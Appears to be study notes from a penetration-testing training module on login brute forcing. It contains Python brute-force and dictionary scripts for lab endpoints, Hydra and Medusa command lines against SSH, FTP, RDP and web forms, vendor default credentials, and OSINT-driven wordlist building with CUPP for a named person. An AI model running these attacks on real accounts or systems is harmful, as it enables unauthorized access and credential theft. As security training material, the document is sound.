# Login Brute Forcing

Brute forcing = trial-and-error against passwords/credentials/keys: generate a candidate → apply it → check success → repeat until access or give up. Success depends on password complexity, attacker compute, and defenses (lockouts, CAPTCHAs).

The method family:

* **Simple brute force** — every combination in a charset/length range. Use when you know nothing and have compute to burn.
* **Dictionary attack** — pre-compiled wordlist of likely passwords. Weak/common passwords.
* **Hybrid** — dictionary words mutated with appended/prepended chars, years, symbols. Slightly-modified common passwords (the `Summer2023` → `Summer2023!` pattern).
* **Credential stuffing** — leaked creds from one service replayed elsewhere, banking on reuse.
* **Password spraying** — few common passwords against many usernames, spreading attempts to dodge lockouts.
* **Reverse brute force** — one password against many usernames.
* **Rainbow tables** — precomputed hash tables for fast reversal of many hashes.
* **Distributed brute force** — the workload across a cluster.

In a pentest, brute forcing is the move when other avenues are exhausted, password policy is weak, or a specific (privileged) account is the target.

## Password Security Fundamentals

Search-space math: `combinations = charset_size^length`. 6 lowercase = 26^6 ≈ 300M; 8 lowercase ≈ 200B; 8 mixed-case = 52^8 ≈ 53T; 12 full-ASCII = 94^12 ≈ 4.7×10^23. Length beats everything — each extra character multiplies the space.

Strong password anatomy (NIST-flavored): length first (12+ minimum, passphrases favored over pure complexity), complexity still expands the per-character pool, uniqueness per account, randomness (no dictionary words, personal info, `qwerty`/`123456`/`p@ssw0rd` patterns). Policies (min length, complexity, expiry, history) can backfire into written-down passwords and `Winter24!`-style increments.

**Default credentials are the low-hanging fruit.** A few from the module's table: Linksys/D-Link/TP-Link/Asus routers `admin:admin`, Netgear/Belkin `admin:password`, Cisco `cisco:cisco`, Zyxel `admin:1234`, Hikvision DVR `admin:12345`, Axis cameras `root:pass`, UniFi APs `ubnt:ubnt`, Canon printers `admin:admin`, Honeywell thermostat `admin:1234`. Default usernames (admin/root/user) alone shrink the attack space — half the battle is the username. SecLists keeps `top-usernames-shortlist.txt`.

Password posture drives tool selection, resource estimates, and where the weak points are.

## Brute Force Attacks

Pure enumeration against a live endpoint. Module demo — a `/pin` endpoint taking a 4-digit PIN:

```python
import requests

ip = "127.0.0.1"
port = 1234

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

10,000 max attempts for a 4-digit space — pure brute force is viable exactly when the space is small.

## Dictionary Attacks

Exploits human predictability: memorable over secure. Wordlist quality decides success — tailor it to the target (gaming terms for gamers, company name + employee names + industry jargon for a corporate portal). Wordlist sources: public lists (SecLists), custom builds from recon, industry/company-specialized lists, pre-packaged lists on pentest distros (rockyou.txt on Parrot).

Useful lists:

* `rockyou.txt` — millions of leaked RockYou passwords; the default password dictionary.
* `top-usernames-shortlist.txt` — quick username attempts.
* `xato-net-10-million-usernames.txt` — thorough username brute forcing.
* `2023-200_most_used_passwords.txt` — current common passwords.
* `Default-Credentials/default-passwords.txt` — router/software/device defaults.

Dictionary attack demo (fetches its own list and POSTs each candidate):

```python
import requests

ip = "127.0.0.1"
port = 1234

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## Hybrid Attacks

Password-expiry policies breed predictable mutations (`Summer2023` → `Summer2023!` → `Summer2024`). Hybrid = dictionary pass first for low-hanging fruit, then targeted brute force on the dictionary words (append digits/symbols, increment years) — far smaller space than raw brute force, far wider coverage than plain dictionary.

**Policy-filtering a wordlist with grep chains** — take only candidates that could pass the target's policy. For min length 8 + uppercase + lowercase + digit on `darkweb2017_top-10000.txt`:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
wc -l darkweb2017-number.txt     # 89 candidates from 10,000
```

**Credential stuffing**: acquire leaked username/password pairs (breaches, phishing, or wordlists as a starting point), pick targets where those users likely have accounts, replay at scale while mimicking normal behavior. Powered entirely by password reuse — one breach, domino effect. (Fix: unique passwords + MFA.)

## Hydra

Fast, parallel, modular network login cracker — web apps, SSH, FTP, databases, and more.

```
hydra [login_options] [password_options] [attack_options] [service_options]
```

* `-l LOGIN` / `-L FILE` — single username / username list
* `-p PASS` / `-P FILE` — single password / password list
* `-t TASKS` — parallel threads; `-f` — stop on first success
* `-s PORT` — non-default port; `-v`/`-V` — verbosity
* `-M FILE` — target list (multiple hosts)
* `-x min:max:charset` — brute-force generation mode (e.g. `-x 6:8:abc...XYZ0123456789`)

Service modules: `ftp`, `ssh`, `http-get`/`http-post-form`, `smtp`, `pop3`, `imap`, `mysql`, `mssql`, `vnc`, `rdp`.

Patterns:

```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get         # basic auth
hydra -l root -p toor -M targets.txt ssh                                # same creds, many hosts
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp   # non-standard port
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp   # generated charset
```

## Basic HTTP Authentication

Basic Auth flow: server answers 401 + `WWW-Authenticate` → browser prompts → credentials sent as `Authorization: Basic <base64(user:pass)>` on every request. Base64 is encoding, not encryption — and the scheme is a classic brute-force target.

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

Hydra against it (username known, so only the password list):

```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

`http-get` module, path `/`, `-s 81` for the non-standard port. Output line: `[81][http-get] host: ... login: basic-auth-user password: ...`.

## Login Forms

Custom login forms POST credentials as form data (`application/x-www-form-urlencoded`, body like `username=john&password=secret123`). Hydra's `http-post-form` automates them:

```
hydra [options] target http-post-form "path:params:condition_string"
```

**Condition string** — how Hydra judges each attempt:

* `F=...` — failure string in the response (most common; e.g. `F=Invalid credentials`)
* `S=...` — success signal: status code (`S=302` redirect after login) or content (`S=Dashboard`, `S=Welcome`)

Build the params string from recon: inspect the form HTML for field names and method; F12 → Network tab to watch a real POST (path + parameters + response); Burp/ZAP interception for complex cases (hidden fields, CSRF tokens — static or dynamic values must be included in the params string).

Module walkthrough — form posts `username`/`password` to `/`, failure shows "Invalid credentials":

```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <IP> -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

`^USER^`/`^PASS^` are the wordlist placeholders; `-f` stops at the first valid pair.

## Medusa

Alternative parallel login bruyte-forcer — same job, different syntax:

```
medusa [target_options] [credential_options] -M module [module_options]
```

* `-h HOST` / `-H FILE` — target / target list; `-u` / `-U`, `-p` / `-P` — creds/lists
* `-M module` — ftp, http, imap, mysql, pop3, rdp, ssh, svn, telnet, vnc, web-form...
* `-m "OPTION"` — module-specific options
* `-t TASKS`; `-f`/`-F` — fast mode (current host / any host); `-n PORT`; `-v LEVEL` (up to 6)
* `-e ns` — extra checks: empty passwords (`n`) and password = username (`s`)

Patterns:

```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET     # basic auth across hosts
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name                     # empty + same-as-user passwords
```

## Web Services

Module's SSH → FTP chain:

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
# ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: ... [SUCCESS]

ssh sshuser@<IP> -p <PORT>
```

Inside the shell, pivot discovery:

```bash
netstat -tulpn | grep LISTEN     # port 21 listening
nmap localhost                   # confirms ftp
```

Username intel from the filesystem (`/home/ftpuser` → likely FTP user `ftpuser`), then the local attack (127.0.0.1 so Medusa uses IPv4 explicitly):

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

Collect the flag:

```bash
ftp ftp://ftpuser:<PASSWORD>@localhost
ftp> get flag.txt
```

## Custom Wordlists

Generic lists waste time against a specific person — "Thomas Edison" isn't in xato-10M under his company's naming convention. Custom lists from recon (social media, company sites, public records, news) shrink the space dramatically.

### Username Anarchy

Generate every plausible username permutation for a name:

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git && cd username-anarchy
./username-anarchy -l                        # list formats: first, firstlast, first.last, flast, f.last, lfirst, lastf, firstlast[8], first1, fmlast, FLast, ...
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### CUPP

Common User Passwords Profiler — interactive personalized password list from the target's life:

```bash
cupp -i
```

Feed it name, nickname, birthdate, partner (name/nickname/birthdate), child, pet, company, keywords, then choose special chars / random numbers / leet mode. From a Jane Smith OSINT profile it produces \~46k candidates: capitalized and reversed strings, birthdate concatenations, appended digits/symbols, leetspeak (`j4n3`, `5m1th`), combined mutations (`Jane1994!`).

Filter the CUPP output against the target's password policy (min 6, upper + lower + digit + two specials from `!@#$%^&*`):

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

\~46k → \~7.9k. Fire both lists at the login form:

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt <IP> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

Username list + targeted password list + policy filter + Hydra = the module's full workflow.
